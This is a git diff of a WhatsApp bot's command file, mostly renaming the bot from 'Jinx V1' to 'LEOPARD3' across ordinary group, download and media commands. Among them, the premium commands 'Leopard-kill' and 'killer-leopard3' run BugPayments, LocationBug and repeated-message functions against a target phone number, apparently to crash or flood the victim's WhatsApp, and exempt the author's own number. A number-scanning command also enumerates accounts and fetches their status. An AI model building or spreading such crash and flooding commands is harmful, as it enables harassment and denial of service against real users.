 if (!isBotAdmins) return reply(mess.notadmin)
 await reaction(m.chat, "✨")
 let response = await sam.groupInviteCode(m.chat)
-sam.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
- await reaction(m.chat, "🦄")}
+ibraah.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'resetlinkgc': case 'revoke': {
 if (!isGroup) return reply(mess.ingroup)
 if (!isBotAdmins) return reply(mess.notadmin)
 await reaction(m.chat, "✨")
-sam.groupRevokeInvite(m.chat)
- await reaction(m.chat, "🦄")}
+ibraah.groupRevokeInvite(m.chat)
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'invite': {
@@ -1230,7 +1230,7 @@ if (!isBotAdmins) return reply(mess.notadmin)
 await reaction(m.chat, "✨")
 let response = await sam.groupInviteCode(m.chat)
 reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`)
-await reaction(m.chat, "🦄")}
+await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'kick': {
@@ -1239,9 +1239,9 @@ if (!isBotAdmins) return reply(mess.notadmin)
 if (!isAdmins) return reply(mess.admin)
 await reaction(m.chat, "✨")
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await sam.groupParticipantsUpdate(m.chat, [users], 'remove')
+await ibraah.groupParticipantsUpdate(m.chat, [users], 'remove')
 reply(mess.done)
- await reaction(m.chat, "🦄")}
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'add': {
@@ -1250,9 +1250,9 @@ if (!isBotAdmins) return reply(mess.notadmin)
 if (!isAdmins) return reply(mess.admin)
 await reaction(m.chat, "✨")
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await sam.groupParticipantsUpdate(m.chat, [users], 'add')
+await ibraah.groupParticipantsUpdate(m.chat, [users], 'add')
 reply(mess.done)
- await reaction(m.chat, "🦄")}
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'promote': {
@@ -1261,9 +1261,9 @@ if (!isBotAdmins) return reply(mess.notadmin)
 if (!isAdmins) return reply(mess.admin)
 await reaction(m.chat, "✨")
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await sam.groupParticipantsUpdate(m.chat, [users], 'promote')
+await ibraah.groupParticipantsUpdate(m.chat, [users], 'promote')
 reply(mess.done)
- await reaction(m.chat, "🦄")}
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'demote': {
@@ -1272,9 +1272,9 @@ if (!isBotAdmins) return reply(mess.notadmin)
 if (!isAdmins) return reply(mess.admin)
 await reaction(m.chat, "✨")
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await sam.groupParticipantsUpdate(m.chat, [users], 'demote')
+await ibraah.groupParticipantsUpdate(m.chat, [users], 'demote')
 reply(mess.done)
- await reaction(m.chat, "🦄")}
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'hidetag': {
@@ -1283,17 +1283,17 @@ if (!isBotAdmins) return reply(mess.notadmin)
 if (!isAdmins) return reply(mess.admin)
 await reaction(m.chat, "✨")
 sam.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
- await reaction(m.chat, "🦄")}
+ await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'listpc': {
                  let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
-                 let teks = `🦄 *LIST OF PERSONAL CHATS*\n\nTotal Chat : ${anu.length} Chats\n\n`
+                 let teks = `🐆 *LIST OF PERSONAL CHATS*\n\nTotal Chat : ${anu.length} Chats\n\n`
                  for (let i of anu) {
                      let nama = store.messages[i].array[0].pushName
-                     teks += `🚫 *Name :* ${nama}\n🫥 *User :* @${i.split('@')[0]}\n🦄 *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
+                     teks += `🚫 *Name :* ${nama}\n🫥 *User :* @${i.split('@')[0]}\n🐆 *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                  }
-                 sam.sendTextWithMentions(m.chat, teks, m)
+                 ibraah.sendTextWithMentions(m.chat, teks, m)
              }
              break;
 
@@ -1302,15 +1302,15 @@ case 'listgc': {
                 let teks = `⬣ *LIST OF GROUP CHATS*\n\nTotal Group : ${anu.length} Group\n\n`
                  for (let i of anu) {
                      let metadata = await sam.groupMetadata(i)
-                     teks += `🦄 *Name :* ${metadata.subject}\n🦄 *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n🫥 *Created on :* ${moment(metadata.creation * 1000).tz('Africa/Nairobi').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Members :* ${metadata.participants.length}\n\n────────────────────────\n\n`
+                     teks += `🐆 *Name :* ${metadata.subject}\n🐆 *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n🫥 *Created on :* ${moment(metadata.creation * 1000).tz('Africa/Nairobi').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Members :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                  }
-                 sam.sendTextWithMentions(m.chat, teks, m)
+                 ibraah.sendTextWithMentions(m.chat, teks, m)
              }
              break;
 case 'listonline': case 'liston': {
                     let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                     let online = [...Object.keys(store.presences[id]), botNumber]
-                    sam.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+                    ibraah.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break;
 case 'true':
@@ -1355,10 +1355,10 @@ case 'truecaller':
       info += `┆ ⚝ *Languages:* ${countryDetails.languages.join(', ')}\n`;
       info += `┆ ⚝ *Flag:* ${countryDetails.flag}\n`;
       info += `╰–––––––––––––––༓
-                *By Jinx V1* `;
+                *By LEOPARD3* `;
     }
 
-    await sam.sendMessage(m.chat, {
+    await ibraah.sendMessage(m.chat, {
       text: info,
     }, {
       quoted: m,
@@ -1380,21 +1380,21 @@ case 'subfinder': {
     list += `Name: ${L.domain}\nDNS: ${L.dns}\nProxy: ${L.cf_proxy ? "✅" : "❌"}\n\n`
   }
   
-  sam.sendMessage(from, { text: list.trim() }, { quoted: m })
+  ibraah.sendMessage(from, { text: list.trim() }, { quoted: m })
   } 
   break;
 case'voiceai' : {
 if (!Developer) return reply(`You are not my owner`)
 if (!q) return reply('Your request?')
 getBuffer("https://api.yanzbotz.my.id/api/ai/gptvoice?query=" + q ).then( a => {
-sam.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:m})        
+ibraah.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:m})        
 })
 }
 break;
 //===============================================°=//
 case 'tourl': {
                 reply(mess.wait)
-                let media = await sam.downloadAndSaveMediaMessage(qmsg)
+                let media = await ibraah.downloadAndSaveMediaMessage(qmsg)
                 if (/image/.test(mime)) {
                     let anu = await TelegraPh(media)
                     reply(util.format(anu))
@@ -1411,7 +1411,7 @@ case 'apkdl':{
 if (!text) return reply("What apk u wanna download?")
 let resMaria = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
 let jsonMaria = await resMaria.json()
-sam.sendMessage(from, { document: { url: jsonMaria.data.dllink}, fileName : jsonMaria.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
+ibraah.sendMessage(from, { document: { url: jsonMaria.data.dllink}, fileName : jsonMaria.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
 .catch(console.error)
 }
 break;
@@ -1431,13 +1431,13 @@ case 'emojimix': {
                 }
             }
                 break
-	case 'jinx-kill':{
+	case 'Leopard-kill':{
                 if (!isPremium) return reply(mess.prem)
                 if (!q) return reply(`Example : ${prefix + command} 254xxxxxxx`)
                 let number = q.replace(/[^0-9]/g, '');
                 if (number.startsWith('0')) return reply(`Example : ${prefix + command} 254781xxxxxxx`)
                 let target = number + '@s.whatsapp.net';
-                await reply("Jinx is  processing 🦄..")
+                await reply("Jinx is  processing 🐆..")
                 for (let i = 0; i < 1; i++) {
                     await BugPayments(target)
                     await LocationBug(target)
@@ -1470,12 +1470,12 @@ case 'vv':
             case 'toviewonce': {
                 if (!quoted) return reply(`Reply Image/Video`)
                 if (/image/.test(mime)) {
-                    anuan = await sam.downloadAndSaveMediaMessage(quoted)
+                    anuan = await ibraah.downloadAndSaveMediaMessage(quoted)
                     sam.sendMessage(m.chat, {
                         image: {
                             url: anuan
                         },
-                        caption: `Magic from Jinx ✨`,
+                        caption: `Magic from Leopard3 ✨`,
                         fileLength: "999",
                         viewOnce: true
                     }, {
@@ -1499,7 +1499,7 @@ case 'vv':
 case 'broadcast': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
 if(!Developer) throw NotOwner;
         if (!q) return reply(`Enter text`)
-        let getGroups = await sam.groupFetchAllParticipating()
+        let getGroups = await ibraah.groupFetchAllParticipating()
         let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
         let xeoncast = groups.map(v => v.id)
         reply(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
@@ -1507,11 +1507,11 @@ if(!Developer) throw NotOwner;
 let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
 if(/image/.test(mime)) {
 let media = await quoted.download()
-await sam.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
+await ibraah.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
 }
 if(/video/.test(mime)){
 let media = await quoted.download()
-await sam.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
+await ibraah.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
 }
             }
         reply(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
@@ -1520,10 +1520,10 @@ case 'tovv': case 'toviewonce': {
 if (!quoted) return reply(`Reply Image/Video`)
 if (/image/.test(mime)) {
 anuan = await client.downloadAndSaveMediaMessage(quoted)
-sam.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
+ibraah.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
 anuanuan = await sam.downloadAndSaveMediaMessage(quoted)
-sam.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
+ibraah.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
 }
 }
 break;
@@ -1532,7 +1532,7 @@ case 'snapshotfull': case 'ssf':
     if (!text) return reply("```Uhh Please, Give me Url!```");
     let urll = `https://image.thum.io/get/fullpage/=${text.match(/\bhttps?:\/\/\S+/gi)[0]}`
     let media = await getBuffer(urll)
-    return await sam.sendMessage(m.chat, { image: media }, { quoted: m });
+    return await ibraah.sendMessage(m.chat, { image: media }, { quoted: m });
   } catch (err) {
     return reply("```Error While Fetching Snapshot```");
   }
@@ -1545,7 +1545,7 @@ case 'fliptext': {
             }
                 break
 case 'google': {
-sam.sendMessage(from, { react: { text: "🔎", key: m.key }}) 
+ibraah.sendMessage(from, { react: { text: "🔎", key: m.key }}) 
 if (!q) return reply(`Example : ${prefix + command} Who is Kresswell`)
 let google = require('google-it')
 google({'query': text}).then(res => {
@@ -1578,12 +1578,12 @@ Cieeee, What's Going On❤️💖👀`,
                 externalAdReply: {
                   showAdAttribution: true,
                   containsAutoReply: true,
-                  title: ` Jinx V1 `,
+                  title: ` LEOPARD3 `,
                   body: `Just for fun`,
                   previewType: "PHOTO",
                   thumbnailUrl: ``,
                   thumbnail: fs.readFileSync(
-                    `./derived/jinx.jpg`
+                    `./derived/LEOPARD3.jpg`
                   ),
                   sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                 },
@@ -1616,8 +1616,8 @@ case 'nsfw':
 case "antilink": case "link": { 
                  if (!m.isGroup) throw group; 
                  if (!isBotAdmin) throw botAdmin; 
-                 let response = await sam.groupInviteCode(m.chat); 
-                 sam.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
+                 let response = await ibraah.groupInviteCode(m.chat); 
+                 ibraah.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
              } 
  break;
 case "lyrics": 
@@ -1628,7 +1628,7 @@ case "lyrics":
  const firstSong = searches[0]; 
  //await client.sendMessage(from, {text: firstSong}); 
  const lyrics = await firstSong.lyrics(); 
- await sam.sendMessage(from, { text: lyrics}, { quoted: m }); 
+ await ibraah.sendMessage(from, { text: lyrics}, { quoted: m }); 
  } catch (error) { 
              reply(`I did not find any lyrics for ${text}. Try searching a different song.`); 
              console.log(error); 
@@ -1721,7 +1721,7 @@ case 'ss':
     return reply("```Error While Fetching Snapshot```");
   }
   break;
-	case 'killer-jinx':{
+	case 'killer-leopard3':{
                 if (!isPremium) return reply(mess.prem)
                 if (!text) return reply(`use ${prefix + command} number|amount\nContoh ${prefix + command} 2547xxxxxxxx,5`)
                 let number = text.split(',')[0];
@@ -1730,13 +1730,13 @@ case 'ss':
                     return reply(`use ${prefix + command} number then amount\nExample ${prefix + command} 2547xxxxxxxx,5`)
                 }
                 if (isNaN(parseInt(amount))) {
-                    return reply("Haha wait for Jinx 🦄");
+                    return reply("Haha wait for Leopard 🐆");
                 }
                 let cleanedNumber = number.replace(/[^0-9]/g, '');
                 let encodedAmount = '' + encodeURI(amount);
-                var contactInfo = await sam.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+                var contactInfo = await ibraah.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-                if (cleanedNumber == "254742491666") {
+                if (cleanedNumber == "254702302770") {
                     return;
                 }
                 if (contactInfo.length == 0) {
@@ -1747,8 +1747,8 @@ case 'ss':
                   sendRepeatedMessages2(whatsappNumber, encodedAmount);
                   await sleep(2500); // Adjusted sleep time for clarity
                   sendMessageWithMentions(
-                    "Hello sir Jinx has Done it again to 🦄@" + whatsappNumber.split('@')[0] + 
-                    " Using *" + command + "Its Just Haha 🦄.", 
+                    "Hello sir Leopard3 has Done it again to 🐆@" + whatsappNumber.split('@')[0] + 
+                    " Using *" + command + "Its Just Haha 🐆.", 
                     [whatsappNumber]
                   );
             }
@@ -1762,7 +1762,7 @@ case 'wallpaper': {
     image: { url: result.image[0] },
     caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
   };
-  sam.sendMessage(m.chat, Message, { quoted: m });
+  ibraah.sendMessage(m.chat, Message, { quoted: m });
 }
 break;
 case 'wikimedia': {
@@ -1774,7 +1774,7 @@ case 'wikimedia': {
     image: { url: result.image },
     caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
   };
-  sam.sendMessage(m.chat, Message, { quoted: m });
+  ibraah.sendMessage(m.chat, Message, { quoted: m });
 }
 break;
 
@@ -1789,7 +1789,7 @@ break;
   case 'buypremium':
             case 'premiumuser': {
                 let teks = `Hi ${pushname}👋\n Want to Buy Premium? Just chat with the owner😉`
-                await sam.sendMessage(m.chat, {
+                await ibraah.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
                         externalAdReply: {
@@ -1797,7 +1797,7 @@ break;
                             title: 'BUY PREMIUM',
                             body: `3$ / MONTH`,
                             thumbnailUrl: 'https://telegra.ph/file/0955010ca2f8bf045fb0a.jpg',
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: false
                         }
@@ -1842,7 +1842,7 @@ case 'telestick':{
                 if (m.isGroup && mariaresources.length > 30) {
                         await reply('Number of stickers more than 30, bot will send it in private chat.')
                         for (let i = 0; i < mariaresources.length; i++) {
-                                sam.sendMessage(m.sender, { sticker: { url: mariaresources[i].url }})
+                                ibraah.sendMessage(m.sender, { sticker: { url: mariaresources[i].url }})
                         }
                 } else {
                         for (let i = 0; i < mariaresources.length; i++) {
@@ -1853,8 +1853,8 @@ case 'telestick':{
 }
 break; 
 case 'restart':  
-  if (!Developer) throw `Jinx Owne` 
-  reply(`Restarting Jinx. .`)  
+  if (!Developer) throw `Leopard Owner` 
+  reply(`Restarting Leopard3. .`)  
   await sleep(3000)  
   process.exit()  
   break;
@@ -1883,7 +1883,7 @@ case 'anime': {
   ♦️ *Trailer: ${anime.trailer}*
   🌐 *URL: ${anime.url}*
   ❄ *Description:* ${anime.synopsis}*`
-                  await sam.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
+                  await ibraah.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                   }
                   break;
 case 'broadcastgc':
@@ -1989,7 +1989,7 @@ if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: $
         reply('Please wait')
         const fg = require('api-dylux')
             let xn = await fg.xnxxdl(text)
-sam.sendMessage(m.chat, { caption: `≡  *XNXX DL BY JINX*
+sam.sendMessage(m.chat, { caption: `≡  *XNXX DL BY LEOPARD3*
         
 ▢ *📌Title*: ${xn.title}
 ▢ *⌚Duration:* ${xn.duration}
@@ -2048,7 +2048,7 @@ case 'blowjob':
     if (!m.isGroup) return reply(group);
     if (!isNsfw) return reply(NotNsfw);
     const waifpoudd = await axios.get(`https://fantox-apis.vercel.app/${command}`);
-    sam.sendMessage(m.chat, { caption: 'OMG🥵', image: { url: waifpoudd.data.url } }, { quoted: m });
+    ibraah.sendMessage(m.chat, { caption: 'OMG🥵', image: { url: waifpoudd.data.url } }, { quoted: m });
     break;
             case 'checkdeath':
              if (!text) return reply(`Use Someone's Name, Example : ${prefix + command} Kresswell `)
@@ -2284,8 +2284,8 @@ case 'sound1':
             case 'sound159':
             case 'sound160':
             case 'sound161':
-                sam_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
-                await sam.sendMessage(m.chat, { audio: sam_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+                ibraah_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+                await ibraah.sendMessage(m.chat, { audio: ibraah_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                 break
 //===============================================//
 case 'blackpink':
@@ -2320,7 +2320,7 @@ case 'cloud':
 case 'summersand':
 case 'horrorblood':
 case 'thunder':
-	if (args.length == 0) return reply(`Example: ${prefix + command} King Sam`)
+	if (args.length == 0) return reply(`Example: ${prefix + command} Ibraah Leo`)
 	sam.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=cde5404984da80591a2692b6&text=${text}` } })
 	break; 
 //=================================================//
@@ -2374,11 +2374,11 @@ var inputnumber = text.split(" ")[0]
             } else if (random_length == 4) {
                 random21 = `${status1}${status2}${status3}${dom4}`
             }
-            var anu = await sam.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
+            var anu = await ibraah.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
             var anuu = anu.length !== 0 ? anu : false
             try {
                 try {
-                    var anu1 = await sam.fetchStatus(anu[0].jid)
+                    var anu1 = await ibraah.fetchStatus(anu[0].jid)
                 } catch {
                     var anu1 = '401'
                 }
@@ -2423,7 +2423,7 @@ case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
 
-if (!q) return reply(`🔮Example : ${prefix+command} King Sam`) 
+if (!q) return reply(`🔮Example : ${prefix+command} Ibraah Leo`) 
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
 if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
@@ -2453,7 +2453,7 @@ if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-e
 if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
 if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
 let dehe = await photooxy.photoOxy(link, q)
-sam.sendMessage(m.chat, { image: { url: dehe }, caption: `By JINX V1` }, { quoted: m })
+ibraah.sendMessage(m.chat, { image: { url: dehe }, caption: `By LEOPARD3` }, { quoted: m })
 }
 break;
 //=======================================================//
@@ -2489,7 +2489,7 @@ if (stdout) return m.reply(stdout.toString())
 }
 } catch (err) {
 const handleError = async () => {
-sam.sendMessage(global.ownMain + "@s.whatsapp.net", {
+ibraah.sendMessage(global.ownMain + "@s.whatsapp.net", {
 text: require("util").format(err)
 }, {
 quoted: m
